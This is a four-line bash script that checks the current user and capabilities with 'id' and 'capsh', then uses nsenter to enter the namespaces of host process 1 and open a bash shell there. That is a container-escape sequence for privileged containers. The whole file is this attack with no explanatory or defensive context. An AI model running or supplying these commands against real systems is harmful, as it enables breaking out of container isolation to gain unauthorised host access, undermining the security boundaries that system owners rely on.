#!/bin/bash

id
capsh
nsenter -t 1 -p -n -u
nsenter --mount=/proc/1/ns/mnt /bin/bash